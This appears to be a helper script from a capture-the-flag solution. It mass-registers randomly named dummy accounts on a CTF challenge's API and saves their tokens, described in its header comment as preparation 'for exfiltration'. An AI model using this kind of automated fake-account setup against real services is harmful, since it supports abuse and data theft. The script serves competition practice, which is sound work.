# Creates dummy accounts for exfiltration, saves details to accounts.json

import requests
import random
import string
import json

url = "http://chals.tisc25.ctf.sg:23196/api/register"

def randstr(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

def register(username, password):
    data = {
        "username": (None, username),
        "password": (None, password),
        "bio": (None, ""),
        "secret": (None, "")
    }
    resp = requests.post(url, files=data)
    if resp.status_code == 200:
        token = resp.json()["token"]
        return token

accounts = {}

for i in range(1, 5):
    username = randstr()
    password = randstr()
    token = register(username, password)
    accounts[f"l{i}"] = {"username": username, "token": token}

for i in ["+", "-", "*", "/"]:
    username = randstr()
    password = randstr()
    token = register(username, password)
    accounts[i] = {"username": username, "token": token}

for i in range(1, 6):
    username = randstr()
    password = randstr()
    token = register(username, password)
    accounts[f"r{i}"] = {"username": username, "token": token}

print(json.dumps(accounts))
